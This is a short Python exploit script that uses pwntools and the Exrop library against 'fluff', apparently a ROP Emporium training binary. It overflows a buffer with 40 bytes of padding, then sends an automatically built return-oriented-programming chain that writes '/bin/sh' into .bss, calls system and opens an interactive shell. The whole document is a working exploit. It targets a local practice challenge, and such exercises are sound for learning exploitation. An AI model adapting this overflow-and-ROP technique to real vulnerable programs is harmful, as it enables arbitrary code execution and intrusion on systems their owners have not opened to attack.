from Exrop import Exrop
from pwn import *

binname = "fluff"
rop = Exrop(binname)
rop.find_gadgets(cache=True, add_opt="--depth 15")
elf = ELF(binname, checksec=False)
bss = elf.bss()
system = elf.symbols['system']
chain = rop.func_call(system, ("/bin/sh",), elf.bss())
chain.dump()
buf = b"A"*40
buf += chain.payload_str()
p = process("./fluff")
p.sendlineafter("> ", buf)
p.interactive()
